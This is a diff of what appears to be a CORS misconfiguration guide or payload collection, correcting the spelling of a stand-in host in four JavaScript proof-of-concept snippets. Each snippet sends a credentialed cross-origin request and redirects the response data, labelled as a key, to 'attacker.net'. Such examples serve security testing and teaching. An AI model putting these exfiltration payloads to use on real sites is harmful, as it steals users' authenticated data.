@@ -56,7 +56,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -174,7 +174,7 @@ req.open('get','https://api.internal.example.com/endpoint',true);
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -210,7 +210,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
@@ -243,7 +243,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.net/log?key='+this.responseText; 
 };
 ```
 
